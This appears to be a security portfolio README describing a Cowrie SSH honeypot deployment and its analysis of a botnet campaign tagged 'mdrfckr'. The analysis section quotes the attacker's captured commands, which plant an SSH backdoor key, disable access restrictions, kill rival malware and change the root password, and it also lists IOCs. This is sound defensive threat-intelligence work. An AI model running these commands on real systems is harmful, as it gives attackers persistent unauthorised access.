# 🍯 Cowrie SSH Honeypot — Production Deployment & Threat Analysis

A production-grade SSH honeypot deployed on a public-facing VPS, capturing real-world attack traffic. This project documents the full setup, automation, and findings from live threat actor activity — including the attribution of an active botnet campaign.

-----

## 📋 Table of Contents

- [Infrastructure Overview](#infrastructure-overview)
- [Setup & Installation](#setup--installation)
- [Telegram Alerting & AbuseIPDB Integration](#telegram-alerting--abuseipdb-integration)
- [Live Findings — mdrfckr Botnet Campaign](#live-findings--mdrfckr-botnet-campaign)
- [IOC List](#ioc-list)
- [Key Takeaways](#key-takeaways)

-----

## Infrastructure Overview

|Component          |Details                                     |
|-------------------|--------------------------------------------|
|VPS Provider       |Hetzner Cloud                               |
|OS                 |Ubuntu 24.04 LTS                            |
|RAM                |4 GB                                        |
|Cowrie Installation|Native (non-Docker), systemd service        |
|Cowrie User        |Dedicated unprivileged system user `cowrie` |
|Port Redirect      |iptables NAT: port 22 → Cowrie port 2222    |
|Real SSH Access    |Non-standard port (not disclosed)           |
|Alerting           |Telegram Bot via Python systemd service     |
|Threat Intel       |AbuseIPDB API (reputation scoring per alert)|

-----

## Setup & Installation

### 1. System Dependencies

```bash
sudo apt update && sudo apt upgrade -y
sudo apt install -y git python3-venv python3-dev libssl-dev libffi-dev \
    build-essential libpython3-dev authbind
```

### 2. Dedicated Cowrie User

```bash
sudo adduser --disabled-password --gecos "" --shell /bin/bash cowrie
```

### 3. Clone & Install Cowrie

```bash
sudo su - cowrie
git clone https://github.com/cowrie/cowrie.git
cd cowrie
python3 -m venv cowrie-env
source cowrie-env/bin/activate
pip install --upgrade pip
pip install -r requirements.txt
```

### 4. Configuration

```bash
cp etc/cowrie.cfg.dist etc/cowrie.cfg
```

Key settings in `cowrie.cfg`:

```ini
[honeypot]
hostname = srv04
listen_port = 2222

[output_jsonlog]
enabled = true
```

### 5. iptables NAT Rule

Redirect incoming port 22 traffic to Cowrie’s port 2222:

```bash
sudo iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222
sudo iptables-save | sudo tee /etc/iptables/rules.v4
```

### 6. systemd Service

`/etc/systemd/system/cowrie.service`:

```ini
[Unit]
Description=Cowrie SSH Honeypot
After=network.target

[Service]
User=cowrie
WorkingDirectory=/home/cowrie/cowrie
ExecStart=/home/cowrie/cowrie/cowrie-env/bin/python bin/cowrie start -n
ExecStop=/home/cowrie/cowrie/cowrie-env/bin/python bin/cowrie stop
Restart=always

[Install]
WantedBy=multi-user.target
```

```bash
sudo systemctl daemon-reload
sudo systemctl enable cowrie
sudo systemctl start cowrie
```

-----

## Telegram Alerting & AbuseIPDB Integration

A custom Python daemon (`analyze_cowrie.py`) runs as a separate systemd service. It tails the Cowrie JSON log in real time and sends enriched alerts to a private Telegram channel.

### Alert Format

Each alert includes:

- Event type (login attempt / successful login / command executed)
- Username and password used
- Source IP, country, and AbuseIPDB confidence score
- Commands executed (for post-login activity)

### AbuseIPDB Integration

Every source IP is checked against the AbuseIPDB API before the alert is sent. The confidence score (0–100%) is included in each message, allowing immediate triage directly from the Telegram notification.

### systemd Service

The bot runs as a persistent service and survives reboots:

```bash
sudo systemctl enable analyze-cowrie
sudo systemctl start analyze-cowrie
```

-----

## Live Findings — mdrfckr Botnet Campaign

Shortly after deployment, the honeypot captured a coordinated, automated SSH campaign operating across multiple IPs in different countries. All activity was attributed to a single botnet based on a consistent fingerprint.

### Attribution

Every session shared the same RSA public key with the comment field `mdrfckr`. This is the primary IOC linking all observed IPs to a single campaign.

### Attack Chain

**Phase 1 — Credential Brute-Force**

The botnet rotates through common username/password combinations targeting the `root` account.

**Phase 2 — SSH Persistence**

Immediately after a successful login, every node executed the same command block:

```bash
# Remove immutable/append-only file attributes
cd ~; chattr -ia .ssh

# Wipe existing SSH config and plant backdoor key
cd ~ && rm -rf .ssh && mkdir .ssh \
&& echo "ssh-rsa AAAAB3NzaC1yc2E[...]SVKPRK+oRw== mdrfckr" >> .ssh/authorized_keys \
&& chmod -R go= ~/.ssh
```

This establishes permanent SSH access using the attacker’s public key — independent of passwords and unaffected by password changes.

**Phase 3 — Competitor Elimination**

One session also executed cleanup commands designed to remove competing malware and clear access restrictions:

```bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh
pkill -9 secure.sh; pkill -9 auth.sh
echo > /etc/hosts.deny
pkill -9 sleep
```

This indicates the botnet is aware that compromised servers may already be infected by other actors.

**Phase 4 — Post-Exploitation Reconnaissance**

The same session then performed detailed hardware profiling — consistent with evaluating the server for crypto-mining viability:

```bash
# CPU core count and model
cat /proc/cpuinfo | grep name | wc -l
lscpu | grep Model

# RAM
free -m | grep Mem | awk '{print $2,$3,$4,$5,$6,$7}'

# Disk space
df -h | head -n 2 | awk 'FNR == 2 {print $2;}'

# Architecture and OS
uname -m
uname -a

# Running processes and logged-in users
top
w

# Existing cron jobs
crontab -l

# Root password change (credential takeover)
echo "root:4N0F1GfQFwB7"|chpasswd|bash
```

**Phase 5 — Honeypot Evasion Attempt**

The session also ran:

```bash
which ls
ls -lh $(which ls)
```

This is a known technique to detect container environments and honeypots. Cowrie’s emulated responses were convincing enough that the bot continued without aborting.

### Campaign Behaviour

Multiple IPs across France, China, South Korea, and unregistered hosts executed identical command sequences within the same morning window. The nodes showed no awareness of each other — consistent with a distributed botnet where each node operates independently from a shared target list, without real-time coordination.

-----

## IOC List

### Source IPs

|IP             |Country|AbuseIPDB Score|Notes                                                |
|---------------|-------|---------------|-----------------------------------------------------|
|82.97.17.167   |FR     |100%           |Phase 2 only                                         |
|36.104.147.6   |CN     |100%           |Phase 2 only                                         |
|106.252.57.21  |KR     |0%             |Unreported at time of capture — reported to AbuseIPDB|
|175.123.252.126|KR     |100%           |Phase 2 only                                         |
|14.103.228.234 |CN     |100%           |Full chain: Phase 2–5                                |

### SSH Public Key (Backdoor)

```
ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrT0rbMz1+5073fc
B0x8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GV0mNx+9EuW0nvNoaJe0QXxziIg9eLBH
pgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJ0K8rvcEmPecjdySYMb66nylAKGwCEE6WEQ
Hmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYY
jIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr
```

**Key comment:** `mdrfckr` — consistent across all observed sessions. Known campaign identifier in public threat intelligence.

### Credentials Observed

|Username|Password     |
|--------|-------------|
|root    |3245gs5662d34|
|root    |yang5202614  |
|root    |abcABC123!@# |
|root    |r@123456     |

### Post-Exploitation Password Set

`root:4N0F1GfQFwB7` — observed being set via `chpasswd` during Phase 4.

-----

## Key Takeaways

- **Honeypots capture full attack playbooks.** This deployment documented five distinct phases of a real campaign within hours of going live.
- **IOC correlation enables attribution.** A single consistent artefact — the SSH key comment `mdrfckr` — was sufficient to link activity across five IPs in four countries.
- **Botnet nodes operate independently.** Multiple nodes hit the same target without coordination, confirming distributed architecture with no real-time deduplication.
- **Automated bots fail basic honeypot detection.** Despite running `which ls` and similar checks, the bot continued — highlighting the effectiveness of well-configured honeypot emulation against scripted attacks.
- **Unreported IPs matter.** The 0% AbuseIPDB score on `106.252.57.21` demonstrated that active malicious hosts can remain unreported. All captured IPs were submitted to AbuseIPDB.

-----

*Deployed and maintained as part of a self-directed IT security portfolio. All findings are from a production honeypot receiving unsolicited real-world traffic.*
